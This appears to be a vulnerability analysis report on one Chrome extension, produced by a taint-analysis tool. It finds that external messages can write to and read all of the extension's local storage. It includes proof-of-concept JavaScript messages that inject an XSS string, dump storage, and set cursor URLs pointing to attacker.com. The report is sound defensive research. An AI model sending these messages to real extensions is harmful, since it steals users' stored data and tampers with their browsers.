# CoCo Analysis: ccnlabknkigbdflncffhbhbegohbodng

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ccnlabknkigbdflncffhbhbegohbodng/opgen_generated_files/bg.js
Line 965 (obfuscated code with chrome.runtime.onMessageExternal.addListener)
b.data

**Code:**

```javascript
// Background script (bg.js) - Entry point
chrome.runtime.onMessageExternal.addListener(async(b, c, d) => { // Listens to external messages
    switch(b.action) { // b ← attacker-controlled from external message
        case "set": {
            chrome.storage.local.set(b.data), // b.data ← attacker-controlled
            d({action: "saveData"});
            break;
        }
        case "getConfig": {
            chrome.storage.local.get(null, a => {
                d(a); // Sends ALL storage data back to attacker via sendResponse
            });
            break;
        }
        case "changecursor": {
            chrome.storage.local.set({item: b.data.item}); // b.data.item ← attacker-controlled

            const c = await a(chrome.runtime.getURL("arrow.cur"));
            const e = await a(chrome.runtime.getURL("hand.cur"));

            const f = b.data.item;
            f.pointer = e;
            f.cursor = c;
            chrome.storage.local.set({item: f}); // Store attacker-controlled data

            chrome.tabs.query({}, a => {
                for(let b = 0; b < a.length; ++b)
                    chrome.tabs.sendMessage(a[b].id, {action: "changecursor"});
            });
            d({status: true});
            break;
        }
        case "clearcursor": {
            chrome.runtime.sendMessage({action: "clearcursor"});
            chrome.storage.local.set(b.data); // b.data ← attacker-controlled
            d({status: true});
            break;
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious website or extension can send external messages
var extensionId = "ccnlabknkigbdflncffhbhbegohbodng";

// Attack 1: Write arbitrary data to storage
chrome.runtime.sendMessage(extensionId, {
    action: "set",
    data: {
        maliciousKey: "attacker-payload",
        anotherKey: "<script>alert('XSS')</script>"
    }
}, function(response) {
    console.log("Data written:", response);
});

// Attack 2: Read ALL extension storage data
chrome.runtime.sendMessage(extensionId, {
    action: "getConfig"
}, function(response) {
    console.log("Stolen storage data:", response); // Receives all storage
});

// Attack 3: Poison cursor data
chrome.runtime.sendMessage(extensionId, {
    action: "changecursor",
    data: {
        item: {
            id: 999,
            image: "http://attacker.com/malicious.png",
            cursor: "http://attacker.com/cursor.cur",
            pointer: "http://attacker.com/pointer.cur"
        }
    }
}, function(response) {
    console.log("Cursor poisoned:", response);
});
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.local via the "set" action and retrieve ALL stored data back via the "getConfig" action. This creates a full read/write primitive for extension storage accessible to any external website or extension.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ccnlabknkigbdflncffhbhbegohbodng/opgen_generated_files/bg.js
Line 752 'key': 'value'

**Classification:** TRUE POSITIVE

**Reason:** This is the retrieval half of the storage exploitation chain. The "getConfig" case in chrome.runtime.onMessageExternal.addListener calls chrome.storage.local.get(null, a => { d(a) }), which sends ALL storage data back to the external attacker via sendResponse. Combined with Sink 1, this creates a complete read/write primitive.

---

## Sink 3: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ccnlabknkigbdflncffhbhbegohbodng/opgen_generated_files/bg.js
Line 751 var storage_local_get_source = { 'key': 'value' };

**Classification:** TRUE POSITIVE

**Reason:** Same as Sink 2. CoCo detected the mock storage source flowing to sendResponseExternal sink. In the actual extension code, this corresponds to the "getConfig" case that reads all storage and sends it to external attackers.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ccnlabknkigbdflncffhbhbegohbodng/opgen_generated_files/bg.js
Line 965 b.data

**Classification:** TRUE POSITIVE

**Reason:** Duplicate detection of the same vulnerability pattern as Sink 1. Multiple case statements in chrome.runtime.onMessageExternal allow writing attacker-controlled data to storage ("set", "changecursor", "clearcursor" actions).
